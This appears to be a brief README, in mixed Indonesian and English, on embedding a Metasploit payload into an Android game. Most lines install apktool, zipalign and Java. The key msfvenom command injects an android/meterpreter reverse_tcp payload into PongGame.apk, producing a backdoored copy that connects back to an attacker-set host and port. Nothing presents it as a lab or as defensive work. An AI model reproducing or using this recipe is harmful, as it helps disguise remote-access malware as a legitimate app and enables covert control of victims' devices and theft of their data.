# Metasploit-remote-desktop
MSF: Embed MSF exploit dengan msfvenom
```html
install 
apt-get install zipalign apktool
```

apt-get install google-android-build-tools-installer zipalign

pilih situs https://dl.google.com/ untuk download

jika install google-android-build-tools-installer gagal, coba

You can get a list of actual held packages with:
dpkg --get-selections | grep hold

Another method of troubleshooting may be to use aptitude rather than apt-get to try to install your package:

sudo aptitude install google-android-build-tools-installer


msfvenom -x PongGame.apk -p android/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4895 -o PongGame_backdoored.apk

if need install jasigner
apt install openjdk-11-jdk

update-alternative --config java

pilih 1 

